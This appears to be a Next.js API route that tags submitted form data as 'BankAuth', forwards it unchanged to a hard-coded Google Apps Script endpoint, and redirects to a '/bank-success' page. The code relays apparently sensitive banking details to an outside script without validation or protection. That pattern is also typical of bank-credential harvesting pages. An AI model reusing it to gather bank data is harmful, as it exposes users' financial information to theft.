import { NextRequest, NextResponse } from "next/server";

const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz4E3bXooJfAILT1JOHCaiFXVodWfvGB-q6IAwVcSO0sHSvEkwO4yomEZO4w--cFEviuw/exec"

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    body.formType = "BankAuth";

    const res = await fetch(APPS_SCRIPT_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    const result = await res.json();
    if (result.success) return NextResponse.json({ success: true, redirectUrl: "/bank-success" });
    return NextResponse.json({ error: "Failed" }, { status: 500 });
  } catch {
    return NextResponse.json({ error: "Error" }, { status: 500 });
  }
}